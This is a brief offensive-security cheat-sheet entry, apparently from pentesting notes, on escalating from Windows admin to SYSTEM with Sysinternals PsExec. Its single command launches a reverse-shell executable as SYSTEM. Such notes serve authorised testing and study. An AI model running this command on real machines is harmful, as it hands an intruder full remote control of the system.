# PSEXEC (admin to system)

## <mark style="color:red;">PSEXEC.exe</mark>

To escalate from an admin user to full SYSTEM privileges, you can use the PsExec tool from Windows Sysinternals

[https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

```
PsExec64.exe -accepteula -i -s reverse_shell.exe
```
